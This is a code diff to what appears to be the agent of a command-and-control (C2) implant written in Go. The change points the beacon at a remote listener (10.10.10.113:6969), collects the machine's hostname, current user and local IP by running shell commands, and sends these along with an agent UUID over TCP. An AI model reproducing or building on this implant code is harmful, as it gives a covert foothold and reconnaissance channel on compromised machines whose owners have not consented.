@@ -2,10 +2,12 @@ package main
 
 import (
 	"encoding/gob"
+	"fmt"
 	"log"
 	"net"
 	"os/exec"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
@@ -20,14 +22,22 @@ import (
 
 func main() {
 	Agentuuid := uuid.New().String()
-
+	hostname, err := exec.Command("hostname", "-f").Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	user, err := exec.Command("whoami").Output()
 	for {
-		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
+		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
 		if err != nil {
 			log.Fatalln(err) // maybe try diff IP
 		}
+		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
+		ip := fmt.Sprintf("%v", ipAddress)
+		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip
+		// logger.Logf(logger.Debug, "Sending : %s\n", init)
 		// fmt.Fprintf(beacon, "12344\n")
-		_, _ = beacon.Write([]byte(Agentuuid + "\n"))
+		_, _ = beacon.Write([]byte(init + "\n")) // add Ip,user and hostname
 		// text, _ := bufio.NewReader(beacon).ReadString('\n')
 		// message := strings.Split(text, "\n")
 		// if message[0] == "Yes" {
